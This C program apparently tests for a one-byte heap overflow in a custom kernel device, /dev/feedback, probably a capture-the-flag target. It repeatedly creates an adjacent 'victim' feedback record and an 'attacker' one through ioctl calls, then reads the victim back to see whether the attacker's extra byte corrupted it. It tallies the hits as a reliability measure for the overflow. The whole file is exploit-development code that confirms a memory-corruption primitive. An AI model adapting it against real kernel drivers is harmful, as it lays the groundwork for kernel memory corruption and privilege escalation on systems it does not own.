#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/feedback"
#define CMD_CREATE 0xc0207300u
#define CMD_DELETE 0xc0207301u
#define CMD_READ   0xc0207302u

struct request {
    uint64_t id;
    uint64_t size;
    char *name;
    char *feedback;
};

static int xioctl(int fd, uint32_t cmd, struct request *req) {
    errno = 0;
    return ioctl(fd, cmd, req);
}

static int create_fb(int fd, uint64_t id, uint64_t size, unsigned char fill, unsigned char ov) {
    char *name = malloc(0x100);
    char *body = malloc(size + 1);
    if (!name || !body) exit(1);
    memset(name, 0x4e, 0xff);
    memset(body, fill, size);
    body[size] = (char)ov;
    struct request req = { .id = id, .size = size, .name = name, .feedback = body };
    int rc = xioctl(fd, CMD_CREATE, &req);
    free(name);
    free(body);
    return rc;
}

static int read_fb(int fd, uint64_t id, unsigned char *out, size_t outsz) {
    memset(out, 0, outsz);
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = (char *)out };
    return xioctl(fd, CMD_READ, &req);
}

static int del_fb(int fd, uint64_t id) {
    struct request req = { .id = id, .size = 0, .name = NULL, .feedback = NULL };
    return xioctl(fd, CMD_DELETE, &req);
}

int main(void) {
    int fd = open(DEV, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    unsigned char out[0x80];
    int hits = 0;
    int tests = 0;

    puts("[+] test: victim create first, attacker create second");
    for (int t = 0; t < 128; t++) {
        uint64_t vid = 0x1500000 + (uint64_t)t * 2;
        uint64_t aid = vid + 1;
        unsigned char ov = (unsigned char)(0xa0 + (t & 0x3f));

        if (create_fb(fd, vid, 0x40, 0x55, 0x5a) != 0) {
            printf("victim create fail t=%d errno=%d\n", t, errno);
            continue;
        }
        if (create_fb(fd, aid, 0x40, 0x66, ov) != 0) {
            del_fb(fd, vid);
            printf("attacker create fail t=%d errno=%d\n", t, errno);
            continue;
        }

        tests++;
        if (read_fb(fd, vid, out, sizeof(out)) == 0) {
            int b0 = out[0] == ov;
            int tail_same = 1;
            for (int i = 1; i < 8; i++) {
                if (out[i] != 0x55) {
                    tail_same = 0;
                    break;
                }
            }
            if (b0 && tail_same) {
                hits++;
                if (hits <= 20) {
                    printf("HIT t=%d ov=0x%02x victim0=0x%02x\n", t, ov, out[0]);
                }
            }
        }

        del_fb(fd, aid);
        del_fb(fd, vid);
    }

    printf("[+] summary tests=%d hits=%d\n", tests, hits);

    close(fd);
    return 0;
}